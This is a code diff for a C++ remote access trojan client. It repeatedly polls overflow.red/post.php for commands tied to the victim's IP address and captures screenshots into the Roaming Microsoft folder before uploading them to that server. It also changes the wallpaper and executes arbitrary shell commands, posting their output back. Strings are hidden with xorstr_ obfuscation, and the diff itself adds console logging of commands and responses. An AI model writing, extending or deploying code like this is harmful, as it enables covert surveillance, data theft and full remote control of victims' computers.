@@ -12,9 +12,6 @@ namespace client {
 			while (true) {
 				auto cmd = requests::get_request("https://overflow.red/post.php", "cmd=get_command&ip=" + client::ip);
 				if (!cmd.empty()) {	
-					char buff[256];
-					sprintf_s(buff, "%s", cmd.c_str());
-	
 					if (cmd == "screenshot") {
 						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
 						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
@@ -48,7 +45,10 @@ namespace client {
 						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Set Wallpaper**\n```\n") + message + xorstr_("\n```"));
 					}
 					else {
+						std::cout << cmd.c_str() << std::endl;
 						auto response = helpers::exec(cmd.c_str());
+						std::cout << "\n" + response << std::endl;
+
 						if (response.empty())
 							response = "-Empty-";
 						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Command Response**\n```\n") + response + xorstr_("\n```"));
